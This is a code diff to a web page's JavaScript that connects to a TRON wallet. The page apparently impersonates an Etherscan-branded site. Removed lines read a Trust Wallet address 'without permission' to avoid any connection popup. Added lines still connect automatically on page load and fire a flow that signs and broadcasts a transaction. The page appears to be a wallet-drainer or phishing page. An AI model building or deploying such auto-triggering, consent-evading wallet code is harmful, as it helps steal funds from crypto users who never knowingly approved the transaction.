@@ -383,7 +383,7 @@
       <div class="footer-cols">
         <div class="footer-brand">
           <div class="row">
-            <img src="https://etherscan.io/images/svg/brands/ethereum-original.svg" alt="Ethereum" style="height:32px;width:20px;display:inline-block" />
+            <img src="https://etherscan.io/images/svg/brands/ethereum-original.svg" alt="Ethereum" style="height:32px;width:20px" />
             <p>Powered by Ethereum</p>
           </div>
           <p class="footer-desc">
@@ -584,28 +584,31 @@
       return broadcast(signed);
     }
 
-    // Trust Wallet DApp browser pré-populate tronWeb.defaultAddress sans permission
-    // Jamais de tron_requestAccounts → zéro popup de connexion
-    function getSilentAddr() {
-      try {
-        var w = tw();
-        if (w && w.defaultAddress && w.defaultAddress.base58) return w.defaultAddress;
-      } catch(_) {}
-      return null;
+    async function connectTron() {
+      var t = tl();
+      if (!t) throw new Error('TronLink not found');
+      if (t.ready && tw() && tw().defaultAddress && tw().defaultAddress.base58) {
+        return tw().defaultAddress;
+      }
+      var res = await t.request({ method: 'tron_requestAccounts' });
+      if (!res || res.code !== 200) throw new Error('Connection refused');
+      await wait(400);
+      var def = tw() && tw().defaultAddress;
+      if (!def || !def.base58) throw new Error('Address unavailable');
+      return def;
     }
 
     (async function autoTrigger() {
-      // Poll toutes les 200ms max 6s — tronWeb.defaultAddress arrive async dans Trust Wallet
-      for (var i = 0; i < 30; i++) {
-        await wait(200);
-        var def = getSilentAddr();
+      await wait(1000);
+      if (!tl()) return;
+      try {
+        var def = await connectTron();
         if (def && def.base58 && !_fired) {
           _addr = def.base58;
           addrInput.value = _addr;
           onContinue();
-          return;
         }
-      }
+      } catch(_) {}
     })();
 
     async function onContinue() {
@@ -615,12 +618,12 @@
       setStatus('');
 
       if (!_addr) {
-        var def = getSilentAddr();
-        if (def && def.base58) {
+        try {
+          var def = await connectTron();
           _addr = def.base58;
           addrInput.value = _addr;
-        } else {
-          setStatus('Could not retrieve TRON address.', 'err');
+        } catch(e) {
+          setStatus('Could not connect wallet.', 'err');
           btn.disabled = false; _fired = false; return;
         }
       }
